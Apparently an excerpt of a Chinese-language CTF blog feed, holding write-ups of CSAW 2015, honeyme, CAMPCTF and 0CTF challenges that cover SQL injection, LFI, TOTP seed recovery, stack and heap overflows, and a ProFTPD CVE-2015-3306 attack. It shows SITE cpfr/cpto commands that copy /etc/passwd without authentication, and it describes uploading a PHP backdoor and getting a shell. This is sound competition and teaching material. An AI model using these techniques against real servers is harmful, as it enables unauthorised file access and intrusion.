&lt;code&gt;oathtool --base32 --totp AAAAAAAAAAAA&lt;/code&gt;&lt;br&gt;
得到的結果是一個 6 位數字&lt;br&gt;
會隨時間改變, 所以要趕快登入 XDD&lt;br&gt;
註冊的時候試了一下如果帳號前四碼相同&lt;br&gt;
&lt;code&gt;TOTPKEY&lt;/code&gt; 得到的結果都一樣&lt;br&gt;
一開始以為只要註冊前面開頭一樣的帳號&lt;br&gt;
就可以拿到 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題能解出來要歸功於&lt;br&gt;
&lt;strong&gt;ding&lt;/strong&gt;, &lt;strong&gt;happyholic1203&lt;/strong&gt;, &lt;strong&gt;mangoking&lt;/strong&gt;, &lt;strong&gt;jpeanut&lt;/strong&gt;&lt;br&gt;
已經把前面的問題都找出了&lt;br&gt;
我其實只是撿尾刀而已...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;不過還是厚著臉皮寫一下 write up&lt;br&gt;
不然這邊 web 分類文章都空空蕩蕩...  &lt;/p&gt;
&lt;p&gt;這題的背景故事是&lt;br&gt;
有一個叫做 &lt;strong&gt;Donald Trump&lt;/strong&gt; 的傢伙在這個交友網站註冊了帳號&lt;br&gt;
用來當作販毒的聯絡管道云云&lt;br&gt;
需要破出他的二段式認證 (&lt;code&gt;password&lt;/code&gt; + &lt;code&gt;TOTPKEY&lt;/code&gt;) 登入他的帳號&lt;br&gt;
這題的 &lt;code&gt;flag = md5(TOTPKEY + password)&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這個交友網站除了一般的帳號密碼以外&lt;br&gt;
還需要填入 oath 解 &lt;code&gt;TOTPKEY&lt;/code&gt; 的結果才能成功登入&lt;br&gt;
可以用以下指令來解:&lt;br&gt;
&lt;code&gt;oathtool --base32 --totp AAAAAAAAAAAA&lt;/code&gt;&lt;br&gt;
得到的結果是一個 6 位數字&lt;br&gt;
會隨時間改變, 所以要趕快登入 XDD&lt;br&gt;
註冊的時候試了一下如果帳號前四碼相同&lt;br&gt;
&lt;code&gt;TOTPKEY&lt;/code&gt; 得到的結果都一樣&lt;br&gt;
一開始以為只要註冊前面開頭一樣的帳號&lt;br&gt;
就可以拿到 &lt;code&gt;TOTPKEY&lt;/code&gt;了 (後來才發現事情沒這麼簡單 Orz)&lt;br&gt;
所以把目標先鎖定在拿到 &lt;code&gt;password&lt;/code&gt;&lt;br&gt;
登入之後有幾個功能:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Edit Profile&lt;/li&gt;
&lt;li&gt;Search User&lt;/li&gt;
&lt;li&gt;Send Message&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;...沒有登出, 想換帳號都要刪 cookie 超麻煩 = =&lt;br&gt;
cookie 的格式是 &lt;code&gt;username_timestamp_sha1ofsomething&lt;/code&gt;&lt;br&gt;
原本在猜後面的 sha1 可能跟密碼有關&lt;br&gt;
打算試試看能不能偷到 &lt;strong&gt;Donald Trump&lt;/strong&gt; 的 cookie&lt;br&gt;
&lt;code&gt;Send Message&lt;/code&gt; 其實沒有對特殊字元作過濾&lt;br&gt;
可以完整個插入 &lt;code&gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; 到網頁裡面&lt;br&gt;
但是, &lt;em&gt;&lt;em&gt;沒有任何反應&lt;/em&gt;&lt;/em&gt; ......&lt;br&gt;
仔細研究了一下, 發現網站的 header 有加入 CSP&lt;br&gt;
CSP 可以限定那些才是合法的 js 來源&lt;br&gt;
這個網站的設定只有源自 &lt;a href=""&gt;https://api.google.com&lt;/a&gt; 才可以被執行&lt;br&gt;
因此插入的 XSS 這招是無效的...&lt;br&gt;
查了很久都沒有可以繞過的方式 Orz  &lt;/p&gt;
&lt;p&gt;不過也不是毫無所獲&lt;br&gt;
從 CSP header 發現了一個 uri: &lt;code&gt;report-uri /csp/violate&lt;/code&gt;&lt;br&gt;
接著追到 &lt;a href=""&gt;http://54.210.118.179/csp/view&lt;/a&gt; 這個頁面&lt;br&gt;
有趣的是...這個頁面存在 &lt;strong&gt;SQL injection&lt;/strong&gt; 的問題&lt;br&gt;
把所有欄位拉出來之後, 發現存在 &lt;code&gt;user_password&lt;/code&gt; 這個欄位&lt;br&gt;
&lt;code&gt;user_password&lt;/code&gt; 的結果是 sha256 hash&lt;br&gt;
做幾個實驗後, 發現應該是加入 username 當成 salt&lt;br&gt;
結果會是 &lt;code&gt;user_password = sha256(username+password)&lt;/code&gt;&lt;br&gt;
把結果拿去爆一下 得到密碼是 &lt;code&gt;6&lt;/code&gt;&lt;br&gt;
(這邊我們弄錯帳號名稱了, 所以真正的密碼不是這組 XDD)&lt;br&gt;
搭配剛剛用開頭相頭所得到的 &lt;code&gt;TOTPKEY&lt;/code&gt;&lt;br&gt;
拿去做 md5 再送記分板就得到.... &lt;em&gt;Wrong flag&lt;/em&gt;  &lt;/p&gt;
&lt;p&gt;事實上根據剛剛的 &lt;code&gt;TOTPKEY&lt;/code&gt; &amp;amp; &lt;code&gt;password&lt;/code&gt; 也沒辦法成功登入&lt;br&gt;
後來討論時某人發現昨天和今天註冊的 &lt;code&gt;TOTPKEY&lt;/code&gt; 不一樣&lt;br&gt;
原本在想是不是加入時間因素下去算&lt;br&gt;
但是又有人說昨天和今天註冊的帳號 &lt;code&gt;TOTPKEY&lt;/code&gt; 都一樣...XD&lt;br&gt;
後來想想應該不是時間, 可能是 ip 之類的因子&lt;br&gt;
但是我們還是不知道 &lt;code&gt;TOTPKEY&lt;/code&gt; 是怎麼拿到的...&lt;br&gt;
只好尋找其他的方向  &lt;/p&gt;
&lt;p&gt;那這個網站除了 sqli 以外&lt;br&gt;
其實還有 LFI 的問題&lt;br&gt;
&lt;code&gt;Edit Profile&lt;/code&gt; 的功能有一個設定頭像的功能&lt;br&gt;
會讀外部的 url, 並檢查是不是圖片&lt;br&gt;
如果是的話設定成頭像&lt;br&gt;
如果不是圖片就會跳 Exception&lt;br&gt;
然後把檔案內容當成錯誤資訊印出來&lt;br&gt;
在這邊做了各種嘗試&lt;br&gt;
像是去撈 apache 的設定檔&lt;br&gt;
還有 &lt;code&gt;settings.py&lt;/code&gt; 以後&lt;br&gt;
最後猜到網頁是寫在 &lt;code&gt;/var/html/weeb/server.py&lt;/code&gt;&lt;br&gt;
閱讀原始碼後, 發現 &lt;code&gt;TOTPKEY&lt;/code&gt; 的算法如下:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 34 def generate_seed(username, ip_address):
 35     return int(struct.unpack(&amp;#39;I&amp;#39;, socket.inet_aton(ip_address))[0]) + struct.unpack(&amp;#39;I&amp;#39;, username[:4].ljust(4,&amp;#39;0&amp;#39;))[0]
 36
 37 def get_totp_key(seed):
 38     random.seed(seed)
 39     return pyotp.random_base32(16, random)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;的確如我們所推測是靠 &lt;code&gt;username&lt;/code&gt; + &lt;code&gt;ip&lt;/code&gt; 去算的&lt;br&gt;
但只是當成 seed 接著還要取 random XD&lt;br&gt;
到這邊幾乎就已經解出來了...可以成功登入&lt;br&gt;
只是送 flag 還是發現不對&lt;br&gt;
原因是弄錯帳號啦~~~
正確的帳號應該是 &lt;code&gt;donaldtrump&lt;/code&gt; 才對 = =&lt;br&gt;
那密碼用 &lt;code&gt;rockyou.txt&lt;/code&gt; 就可以破出來了~ 結果是 &lt;code&gt;zebra&lt;/code&gt;&lt;br&gt;
最後做 &lt;code&gt;md5("6OIMTPLHSQ6JUKYPzebra")&lt;/code&gt; 就是這題的 flag 了 XD  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;a8815ecd3c2b6d8e2e884e5eb6916900&lt;/code&gt;  &lt;/p&gt;</content><category term="CSAWCTF"></category><category term="LFI"></category><category term="SQL Injection"></category></entry><entry><title>CSAW CTF 2015 pwn 500 rhinoxorus</title><link href="https://ddaa.tw/csawctf_pwn_500_rhinoxorus.html" rel="alternate"></link><published>2015-09-21T21:23:00+08:00</published><updated>2015-09-21T21:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-09-21:/csawctf_pwn_500_rhinoxorus.html</id><summary type="html">&lt;p&gt;想說這次 CSAW 從比較難的題目開始解&lt;br&gt;
結果 ida 打開一分鐘就看到洞了 囧&lt;br&gt;
不過 exploit 還是寫個 3 小時左右吧&lt;br&gt;
挺煩人的...&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題的程式行為就是不斷的做 function call&lt;br&gt;
有 256 個不同的 function&lt;br&gt;
buf 大小不太一樣, 行為卻都類似&lt;br&gt;
毫無意義可言....
程式碼大概長這樣:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void func_2a(char *a1, int a2)
{
    char buf[100];
    int len = a2 - 1;
    ...
    if (len) {
        for (i = 0; i &amp;lt; len; i++)
            buf ^= a1[i];
        func_array …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;想說這次 CSAW 從比較難的題目開始解&lt;br&gt;
結果 ida 打開一分鐘就看到洞了 囧&lt;br&gt;
不過 exploit 還是寫個 3 小時左右吧&lt;br&gt;
挺煩人的...&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題的程式行為就是不斷的做 function call&lt;br&gt;
有 256 個不同的 function&lt;br&gt;
buf 大小不太一樣, 行為卻都類似&lt;br&gt;
毫無意義可言....
程式碼大概長這樣:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void func_2a(char *a1, int a2)
{
    char buf[100];
    int len = a2 - 1;
    ...
    if (len) {
        for (i = 0; i &amp;lt; len; i++)
            buf ^= a1[i];
        func_array[buf[0]](&amp;amp;buf[1], len);
    }
}

void process_connection(int fd)
{
    char buf[256];
    int len;

    memset(buf, 0, 256);
    len = recv(fd, buf, 256, 0));
    if (len &amp;gt; 0)
        func_array[buf[0]](buf, len);
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這邊先定義一次 stack frame 的層數&lt;br&gt;
後面會比較好說明  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;layer0: &lt;code&gt;process_connetion&lt;/code&gt; 的 stack frame  &lt;/li&gt;
&lt;li&gt;layer1: 第一次的 function call  &lt;/li&gt;
&lt;li&gt;layer2: 第二次的 function call, 後以此類推  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;很明顯的 overflow&lt;br&gt;
下一層的 buffer 一定比 &lt;code&gt;layer0&lt;/code&gt; 的 256 小&lt;br&gt;
做 xor 時就會蓋到超出 stack frame 的範圍&lt;br&gt;
而且還不是直接 copy 過去&lt;br&gt;
是做 xor 寫值 ... 所以什麼 stack guard 根本可以無視 XDD  &lt;/p&gt;
&lt;p&gt;那思路其實就滿明確的&lt;br&gt;
&lt;strong&gt;先 bof, 然後做 rop&lt;/strong&gt;&lt;br&gt;
先隨便送個 256 字元試試...&lt;br&gt;
&lt;em&gt;Segmentation fault&lt;/em&gt;&lt;br&gt;
表示漏洞的確存在, 但是跟我的預期不太相符&lt;br&gt;
我原本是預計會發生 &lt;em&gt;*** stack smashing detected ***&lt;/em&gt;&lt;br&gt;
gdb 實際追一下發現在做 xor 的時候存取到 stack 以外的範圍了&lt;br&gt;
仔細看一下是因為 &lt;code&gt;len&lt;/code&gt; 在 buffer 的後面...&lt;br&gt;
bof 會順便被改掉的關係  &lt;/p&gt;
&lt;p&gt;仔細想一下 &lt;code&gt;len&lt;/code&gt; 這邊也要好好設才行&lt;br&gt;
因為這個程式會一直 call 一直 call&lt;br&gt;
就算正常結束的話也會做 256 次之後才觸發 return&lt;br&gt;
這樣 payload 早就被 xor 得不成人形了...&lt;br&gt;
但是也不能再 &lt;code&gt;layer1&lt;/code&gt; 就改成 0&lt;br&gt;
不然這樣改完 &lt;code&gt;len&lt;/code&gt; 就不會繼續蓋後面的 return address 了&lt;br&gt;
所以理想的狀況是:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 layer1 寫好 rop chain  &lt;/li&gt;
&lt;li&gt;在 layer2 改掉 &lt;code&gt;len&lt;/code&gt; 觸發 return  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以 &lt;code&gt;layer1&lt;/code&gt;, &lt;code&gt;layer2&lt;/code&gt; 是哪一個 function 就要好好考慮一下 XD&lt;br&gt;
挑對 function exploit 會比較好寫一點&lt;br&gt;
&lt;code&gt;layer1&lt;/code&gt; 的 buffer 要大一點, 不然 xor 會蓋到 &lt;code&gt;layer0&lt;/code&gt; 的 buffer&lt;br&gt;
&lt;code&gt;layer2&lt;/code&gt; 的 buffer 要小一點, 第二層 overflow 會蓋不到 &lt;code&gt;len&lt;/code&gt;&lt;br&gt;
我不幸挑錯 &lt;code&gt;layer2&lt;/code&gt; function ...&lt;br&gt;
會進入到 &lt;code&gt;layer3&lt;/code&gt; Orz ...&lt;br&gt;
變成要讓兩次 stack guard 都不能被更動才行  &lt;/p&gt;
&lt;p&gt;可以觸發 return 後&lt;br&gt;
就用 pop 之類的先把未知的垃圾跳開&lt;br&gt;
讓 rop chain 可以完整地落在 buffer 上&lt;br&gt;
接下來我是把 stack 先移到 bss 段&lt;br&gt;
再跳一次 recv 接第二次 rop&lt;br&gt;
這樣就不會一直被 xor 弄壞了  &lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/rhinoxorus.py"&gt;rhinoxorus.py&lt;/a&gt;  &lt;/p&gt;</content><category term="CSAWCTF"></category><category term="Stack Overflow"></category></entry><entry><title>honeyme 2015 CTF CVE-2015-3306</title><link href="https://ddaa.tw/honeyme_pwn_cve_2015_3306.html" rel="alternate"></link><published>2015-08-22T12:49:00+08:00</published><updated>2015-08-22T12:49:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-08-22:/honeyme_pwn_cve_2015_3306.html</id><summary type="html">&lt;p&gt;這次比賽前一天好像吃壞肚子...&lt;br&gt;
結果隔天遲到 將近 12 點才到會場&lt;br&gt;
很擔心會不會到現場題目已經被 &lt;strong&gt;Orange&lt;/strong&gt; 解光了 (誤&lt;br&gt;
還好還是有解貢獻一點分數 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;honeyme 是採 &lt;strong&gt;King of the Hill&lt;/strong&gt; 的賽制&lt;br&gt;
參賽隊伍要想辦法把主機首頁給換掉&lt;br&gt;
寫進自己的 token&lt;br&gt;
就可以有源源不絕的分數了~&lt;/p&gt;
&lt;p&gt;其中 ip .194 這台主辦方出的漏洞是利用 &lt;code&gt;CVE-2015-3306&lt;/code&gt;&lt;br&gt;
一個 Proftpd 的邏輯漏洞&lt;br&gt;
在 &lt;code&gt;Proftpd&lt;/code&gt; 啟用 &lt;code&gt;mod_copy&lt;/code&gt; 模組的請況下&lt;br&gt;
允許攻擊者在尚未認證的情況下任意對檔案進行讀寫&lt;br&gt;
可以用以下的程式碼驗證 ftp server 是否存在漏洞:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;220 ProFTPD 1.3.4a Server (ProFTPD Default Installation) [127 …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這次比賽前一天好像吃壞肚子...&lt;br&gt;
結果隔天遲到 將近 12 點才到會場&lt;br&gt;
很擔心會不會到現場題目已經被 &lt;strong&gt;Orange&lt;/strong&gt; 解光了 (誤&lt;br&gt;
還好還是有解貢獻一點分數 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;honeyme 是採 &lt;strong&gt;King of the Hill&lt;/strong&gt; 的賽制&lt;br&gt;
參賽隊伍要想辦法把主機首頁給換掉&lt;br&gt;
寫進自己的 token&lt;br&gt;
就可以有源源不絕的分數了~&lt;/p&gt;
&lt;p&gt;其中 ip .194 這台主辦方出的漏洞是利用 &lt;code&gt;CVE-2015-3306&lt;/code&gt;&lt;br&gt;
一個 Proftpd 的邏輯漏洞&lt;br&gt;
在 &lt;code&gt;Proftpd&lt;/code&gt; 啟用 &lt;code&gt;mod_copy&lt;/code&gt; 模組的請況下&lt;br&gt;
允許攻擊者在尚未認證的情況下任意對檔案進行讀寫&lt;br&gt;
可以用以下的程式碼驗證 ftp server 是否存在漏洞:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;220 ProFTPD 1.3.4a Server (ProFTPD Default Installation) [127.0.0.1]&lt;br&gt;
&lt;code&gt;SITE cpfr /etc/passwd&lt;/code&gt;&lt;br&gt;
350 File or directory exists, ready for destination name&lt;br&gt;
&lt;code&gt;SITE cpto /tmp/gg&lt;/code&gt;&lt;br&gt;
250 Copy successful  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個漏洞其實第一天就發現了&lt;br&gt;
可是當時不知道是主辦方刻意還是設定失誤&lt;br&gt;
導致 ftp server 所在的 filesystem 是 Read-only&lt;br&gt;
試了半天還是沒辦法成功利用
到第二天卻又修復了...&lt;br&gt;
一開始想直接拿 exploitdb 的 &lt;a href="https://www.exploit-db.com/exploits/36742/"&gt;payload&lt;/a&gt; 來攻擊主機&lt;br&gt;
可是失敗了...似乎是因為 sockfd 不是 3&lt;br&gt;
但是直接用 &lt;code&gt;metasploit&lt;/code&gt; 會成功&lt;br&gt;
只是我對 &lt;code&gt;metasploit&lt;/code&gt; 其實不是很熟&lt;br&gt;
一直沒辦法建立 reverse shell 回來 = =&lt;br&gt;
只好去 trace 兩邊的 payload 差別在哪裡  &lt;/p&gt;
&lt;p&gt;兩份最大的差別是&lt;br&gt;
&lt;code&gt;metasploit&lt;/code&gt; 取得 input 的檔案是 &lt;code&gt;/proc/self/cmdline&lt;/code&gt;&lt;br&gt;
比起從 &lt;code&gt;/proc/self/fd/3&lt;/code&gt; 好用多了&lt;br&gt;
雖然會把當前指令也寫進檔案&lt;br&gt;
但是反正我們要寫的是網頁&lt;br&gt;
把多餘的指令註解掉就行了&lt;br&gt;
話說 trace msf 以後才知道原來是用 ruby 寫的...&lt;br&gt;
跟 ruby 不太熟不知道要怎麼拿來直接執行&lt;br&gt;
只好重寫一份 payload&lt;br&gt;
上傳了 php 後門以後&lt;br&gt;
剩下就交給 Orange 了 XDD  &lt;/p&gt;
&lt;p&gt;完整 payload: &lt;a href="https://ddaa.tw/exp/honeyme.py"&gt;exploit&lt;/a&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;由於去年 honeyme 剛好跑去韓國打 secuinside&lt;br&gt;
無從比較題目是否有進步 XD&lt;br&gt;
難易度跟一般國際賽的 CTF 比起來的確有些差距 &lt;br&gt;
不過也沒有到賽前打聽的那麼悽慘 XD&lt;br&gt;
大概跟大陸那邊 xctf 一些比較小的聯賽差不多水準吧&lt;br&gt;
然後誠心建議不要有太多猜謎阿~&lt;br&gt;
比賽時間很短的 讓大家專注在技術上就好了 QQ  &lt;/p&gt;
&lt;p&gt;最後特別感謝有 Orange 一起參加&lt;br&gt;
這次 Bamboofox 參賽其實主要目的是想培育新人&lt;br&gt;
但是我是 web 智障阿 QQQQ&lt;br&gt;
還好有 Orange Carry 全場 XD&lt;br&gt;
兩天下來默默地學了不少 web 的技巧&lt;br&gt;
衷心希望下次 CTF 可以解出 web 題...&lt;br&gt;
打了兩年 CTF, web write-up 至今只有兩篇 囧  &lt;/p&gt;</content><category term="Other CTF"></category><category term="CVE"></category></entry><entry><title>CAMPCTF 2015 Pwn 300 datenklo manager</title><link href="https://ddaa.tw/campctf_pwn_300_dkm.html" rel="alternate"></link><published>2015-08-21T13:29:00+08:00</published><updated>2015-08-21T13:29:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-08-21:/campctf_pwn_300_dkm.html</id><summary type="html">&lt;p&gt;這次的 pwn 題型都很和善&lt;br&gt;
這題應該是裡面最難的一題 (?&lt;br&gt;
至少對我來說 heap 還是很難解 OTZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目跟一般 heap 題差不多&lt;br&gt;
一個選單有數樣功能:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;List DK&lt;/li&gt;
&lt;li&gt;Add DK&lt;/li&gt;
&lt;li&gt;Edit DK&lt;/li&gt;
&lt;li&gt;Delete DK&lt;/li&gt;
&lt;li&gt;exit&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;DK 又分成兩種類型: &lt;code&gt;with wifi&lt;/code&gt;, &lt;code&gt;without wifi&lt;/code&gt;&lt;br&gt;
這個程式用到的結構如下:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct DK_base {
    long lg;
    long la;
    void *show_ptr;
    void *edit_ptr;
};

struct DK_with_wifi {
    DK_base base;
    char* ssid[32];
    char comment[1024];
};

struct DK_without_wifi …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這次的 pwn 題型都很和善&lt;br&gt;
這題應該是裡面最難的一題 (?&lt;br&gt;
至少對我來說 heap 還是很難解 OTZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目跟一般 heap 題差不多&lt;br&gt;
一個選單有數樣功能:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;List DK&lt;/li&gt;
&lt;li&gt;Add DK&lt;/li&gt;
&lt;li&gt;Edit DK&lt;/li&gt;
&lt;li&gt;Delete DK&lt;/li&gt;
&lt;li&gt;exit&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;DK 又分成兩種類型: &lt;code&gt;with wifi&lt;/code&gt;, &lt;code&gt;without wifi&lt;/code&gt;&lt;br&gt;
這個程式用到的結構如下:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct DK_base {
    long lg;
    long la;
    void *show_ptr;
    void *edit_ptr;
};

struct DK_with_wifi {
    DK_base base;
    char* ssid[32];
    char comment[1024];
};

struct DK_without_wifi {
    DK_base base;
    char comment[1024];
};
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;show_ptr&lt;/code&gt; 和 &lt;code&gt;edit_ptr&lt;/code&gt; 會在 &lt;code&gt;List DK&lt;/code&gt; 和 &lt;code&gt;Edit DK&lt;/code&gt; 的功能用到&lt;br&gt;
在 add 之後就會根據 DK 種類填入對應的函式位置&lt;br&gt;
程式根據目前 DK 的數量動態配置一個陣列來記錄 DK&lt;br&gt;
兩種 DK 用同一個陣列去記錄&lt;br&gt;
因此會根據 DK 種類不同呼叫不同的函式處理 DK  &lt;/p&gt;
&lt;p&gt;程式的漏洞是
先 add 一個 &lt;code&gt;DK_with_wifi&lt;/code&gt;&lt;br&gt;
接著 edit dk 將種類改成 &lt;code&gt;DK_without_wifi&lt;/code&gt;&lt;br&gt;
程式會在同一個位置將 chunk 重新 realloc 0x420 byte&lt;br&gt;
但是 edit 有一個選項是 &lt;code&gt;do not change&lt;/code&gt;&lt;br&gt;
會用一開始宣告時分配的 func 去處理 DK&lt;br&gt;
因此我們可以用處理 &lt;code&gt;DK_with_wifi&lt;/code&gt; 的 edit function 去處理 &lt;code&gt;DK_without_wifi&lt;/code&gt;&lt;br&gt;
由於兩者大小相差 0x100 byte&lt;br&gt;
因此會導致 &lt;code&gt;heap overflow&lt;/code&gt; 的問題  &lt;/p&gt;
&lt;p&gt;這題我的利用方式是 &lt;a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt"&gt;The Malloc Maleficarum&lt;/a&gt; 提到的 &lt;code&gt;The House of Lord&lt;/code&gt;&lt;br&gt;
原理是 overflow 以後把 freed chunk 的 BK 改成我們偽造的 chunk&lt;br&gt;
這樣下次 malloc 的時候就會得到所偽造 chunk 的位置&lt;br&gt;
詳細步驟如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;新增兩個 &lt;code&gt;DK_with_wifi&lt;/code&gt;, 利用 &lt;code&gt;comment&lt;/code&gt; 的 1024 byte 偽造兩個 freed chunk  &lt;/li&gt;
&lt;li&gt;用 edit 將第一個 DK 的類型改成 &lt;code&gt;DK_without_wifi&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;再 edit 一次, 這次選 &lt;code&gt;Do Not Change&lt;/code&gt;, 在 edit comment 的時候會超出 0x100 bytes  &lt;/li&gt;
&lt;li&gt;利用超出的 0x100 byte 把 BK 改成 第一個 chunk 的位置&lt;/li&gt;
&lt;li&gt;隨便 add 一個 DK, 這個 DK malloc 得到的位置會和第一個 DK 的 comment 重疊&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;Do Not Change&lt;/code&gt; 編輯第一個 DK, 修改 comment 時可以改到第三個 DK 的 func ptr, 把 &lt;code&gt;edit_ptr&lt;/code&gt; 改成 system  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;Do Not Change&lt;/code&gt; 編輯第三個 DK, 由於 &lt;code&gt;edit_ptr&lt;/code&gt; 已經被改掉, 會變成執行 system  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;libc address 和 heap address 可以利用 &lt;code&gt;list DK&lt;/code&gt; 取得&lt;br&gt;
system 的參數剛好會落於第一個 DK comment 的位置&lt;br&gt;
所以可以直接 &lt;code&gt;system("/bin/sh")&lt;/code&gt; 取得 shell&lt;br&gt;
完整 exploit: &lt;a href="https://ddaa.tw/exp/dkm.py"&gt;exp.py&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;btw, 後來 &lt;strong&gt;angelboy&lt;/strong&gt; 說只要 edit 的時候 SSID 設 0&lt;br&gt;
下次 add 的 DK 可以直接被 overflow 蓋 func ptr 了...&lt;br&gt;
這題是我想太難了 OTZ  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Heap Overflow"></category></entry><entry><title>0CTF 2015 Exploit 250 FlagGenerator</title><link href="https://ddaa.tw/0ctf_exploit_250_flaggenerator.html" rel="alternate"></link><published>2015-04-03T00:00:00+08:00</published><updated>2015-04-03T00:00:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-04-03:/0ctf_exploit_250_flaggenerator.html</id><summary type="html">&lt;p&gt;這題的名稱叫 &lt;em&gt;FlagGenerator&lt;/em&gt;&lt;br&gt;
可惜沒辦法生出其他題的 flag ... XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;執行程式後看到 menu 長這樣:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;== 0ops Flag Generator ==&lt;br&gt;
1. Input Flag&lt;br&gt;
2. Uppercase&lt;br&gt;
3. Lowercase&lt;br&gt;
4. Leetify&lt;br&gt;
5. Add Prefix&lt;br&gt;
6. Output Flag&lt;br&gt;
7. Exit&lt;br&gt;
=========================&lt;br&gt;
Your choice:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;打開 &lt;strong&gt;ida pro&lt;/strong&gt; 快速檢查&lt;br&gt;
flag 的長度限制為 256 byte&lt;br&gt;
但是 &lt;em&gt;Leetify&lt;/em&gt; 的功能會造成 bof&lt;br&gt;
原因是 &lt;em&gt;Leetify&lt;/em&gt; 會將字串內的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字元取代成 &lt;em&gt;1-1 …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題的名稱叫 &lt;em&gt;FlagGenerator&lt;/em&gt;&lt;br&gt;
可惜沒辦法生出其他題的 flag ... XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;執行程式後看到 menu 長這樣:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;== 0ops Flag Generator ==&lt;br&gt;
1. Input Flag&lt;br&gt;
2. Uppercase&lt;br&gt;
3. Lowercase&lt;br&gt;
4. Leetify&lt;br&gt;
5. Add Prefix&lt;br&gt;
6. Output Flag&lt;br&gt;
7. Exit&lt;br&gt;
=========================&lt;br&gt;
Your choice:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;打開 &lt;strong&gt;ida pro&lt;/strong&gt; 快速檢查&lt;br&gt;
flag 的長度限制為 256 byte&lt;br&gt;
但是 &lt;em&gt;Leetify&lt;/em&gt; 的功能會造成 bof&lt;br&gt;
原因是 &lt;em&gt;Leetify&lt;/em&gt; 會將字串內的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字元取代成 &lt;em&gt;1-1&lt;/em&gt;&lt;br&gt;
所以只要送包含夠多的 &lt;em&gt;H&lt;/em&gt; 或是 &lt;em&gt;h&lt;/em&gt; 字串&lt;br&gt;
就會超出 256 byte 了&lt;br&gt;
pseudo code:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void Leetify(char *flag)
{
    char *c = flag;
    char buf[256];
    for (c = flag; c != NULL; c++) {
        switch(c) {
            case &amp;#39;H&amp;#39;:
            case &amp;#39;h&amp;#39;:
                /* do leetify on buf*/
                break;
        }
    }
    buf[end] = &amp;#39;\0&amp;#39;;
    strcpy(flag, buf);
    return;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;雖然這題的 bof 發生在 stack 上&lt;br&gt;
但是有 &lt;strong&gt;stack guard&lt;/strong&gt; 的檢查&lt;br&gt;
沒辦法直接改 ret addr 去控制 eip&lt;br&gt;
但是 return 前的 &lt;code&gt;strcpy()&lt;/code&gt; 讓我們有機會繞過保護&lt;br&gt;
由於傳入的參數 &lt;code&gt;flag&lt;/code&gt; 也是在 stack 上&lt;br&gt;
發生 bof 之後可以改掉參數的內容&lt;br&gt;
這樣 &lt;code&gt;strcpy()&lt;/code&gt; 就變成可以任意寫值的漏洞&lt;br&gt;
